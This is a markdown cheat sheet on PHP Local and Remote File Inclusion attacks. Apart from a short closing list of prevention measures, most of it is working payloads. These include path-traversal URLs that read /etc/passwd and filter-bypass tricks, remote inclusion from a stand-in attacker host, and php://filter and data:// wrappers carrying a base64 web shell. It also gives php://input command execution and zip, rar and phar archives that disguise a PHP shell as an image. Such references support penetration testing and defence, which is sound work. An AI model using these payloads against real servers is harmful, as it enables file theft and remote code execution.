# LFI-RFI
## Table of contents
1. [File inclusion](#file-inclusion)
2. [What are the differences between File Inclusion vs. Directory Path Traversal?](#what-are-the-differences-between-file-inclusion-vs-directory-path-traversal)
3. [Types of File Inclusion Attacks](#types-of-file-inclusion-attacks)
4. [Payloads](#payloads)
5. [How to Prevent LFI and RFI Attacks?](#how-to-prevent-lfi-and-rfi-attacks)
## File Inclusion
Vulnerable PHP functions: require, require_once, include, include_once

The consequences of these vulnerabilities can range from data exposure and server compromise to the defacement of websites and unauthorized code execution.

## What are the differences between File Inclusion vs. Directory Path Traversal?
Directory Path Traversal can often be a means to exploit File Inclusion vulnerabilities. If an attacker can manipulate the file path, they can use it to achieve LFI (Local File Inclusion).

While Directory Path Traversal primarily focuses on manipulating the file system path, File Inclusion vulnerabilities deal with including external files (either locally or remotely).
## Types of File Inclusion Attacks
- Local File Inclusion (LFI):

  * In an LFI attack, an attacker exploits a vulnerability in a web application to include local files stored on the server.

  * Typically, the attacker manipulates user-controllable input (e.g., URL parameters or cookies) to specify the file path to include.
    
  * Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the page parameter to include local or remote files, leading to unauthorized access or code execution.
```
<?php
$file = $_GET['page'];
include($file);
?>
```
 * In the following examples we include the /etc/passwd file, check the Directory & Path Traversal chapter for more interesting files. http://example.com/index.php?page=../../../etc/passwd
 - Payloads:
   * Path and dot truncation
   * On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE](* Server)
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```
  * Filter bypass tricks
```
http://example.com/index.php?page=....//....//etc/passwd(*server)
http://example.com/index.php?page=..///////..////..//////etc/passwd(*)
http://example.com/index.php?page=../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd(*)
```
- Remote File Inclusion (RFI):
  * In php this is disable by default because allow_url_include is Off. It must be On for it to work, and in that case you could include a PHP file from your server and get RCE:
```
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
## Payloads
- LFI / RFI using PHP wrappers & protocols.

Wrapper protocol in PHP is a mechanism that allows you to access different resources through different protocols like http, ftp, php, file etc., information through functions like fopen, file_get_contents and include. include. This makes it possible for PHP to handle resource types that are not just file systems but also data from URLs, remote connections, and other stream data.
- php://filter
  * PHP filters allow perform basic modification operations on the data before being it's read or written. There are 5 categories of filters:

  * String Filters:

   ++ string.rot13

   ++ string.toupper

   ++ string.tolower

   ++ string.strip_tags: Remove tags from the data (everything between "<" and ">" chars)

- Note that this filter has disappear from the modern versions of PHP

   ++ Conversion Filters

   ++ convert.base64-encode

   ++ convert.base64-decode

   ++ convert.quoted-printable-encode

   ++ convert.quoted-printable-decode

  ++ convert.iconv.* : Transforms to a different encoding(convert.iconv.<input_enc>.<output_enc>) . To get the list of all the encodings supported run in the console: iconv -l
  
 -  Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
 ```
  echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
```
  - Same chain without the "|" char
 ```
  echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
```
  - string.string_tags example
```
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");
```
# Conversion filter
## B64 decode
```
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
```
## Chain B64 encode and decode
```
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
```
## convert.quoted-printable-encode example
```
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
```
## convert.iconv.utf-8.utf-16le
```
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");
```
## data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?> open_basedir trong file cấu hình php.ini phải đươc bật
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
## PHP://input
```
curl -XPOST "http://localhost/LFI-RFI/Index.php?page=php://input" --data "<?php echo shell_exec('whoami'); ?>"
```
## ZIP / PHAR
- PHAR archive structure:(*)
PHAR files work like ZIP files, when you can use the phar:// to access files stored inside them.

Create a phar archive containing a backdoor file: php --define phar.readonly=0 archive.php
```
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
?>
```
- Upload a Zip or Rar file with a PHPShell inside and access it.(*)
In order to be able to abuse the rar protocol it need to be specifically activated.

```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```
- To compress with rar
```
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
Use the phar:// wrapper: curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt
```
 note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
## How to Prevent LFI and RFI Attacks?
- Input Validation
- Whitelist Approach
- Use Absolute Paths (LFI)
- Use Local Copies (RFI)
- Access Controls
- Avoid User-Controllable Inclusion
- Security Headers (RFI)
- Network Segmentation (RFI)
- Regular Updates and Patching (RFI)
- Use a WAF (Web Application Firewall)
